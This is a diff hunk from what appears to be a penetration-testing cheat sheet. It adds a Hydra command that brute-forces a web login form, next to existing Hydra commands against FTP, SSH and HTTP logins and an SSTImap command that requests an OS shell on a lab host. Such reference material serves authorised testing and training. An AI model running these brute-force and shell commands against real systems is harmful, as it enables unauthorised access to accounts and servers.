@@ -1059,6 +1059,7 @@ $ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 $ hydra -l admin -P <password_file> ftp://192.168.1.100
 $ hydra -l root -P <password_file> ssh://192.168.1.100
 $ hydra -l admin -P <password_file> 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+$ hydra -l admin -P <password_file> 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:S=302"
 ```
 
 - Medusa
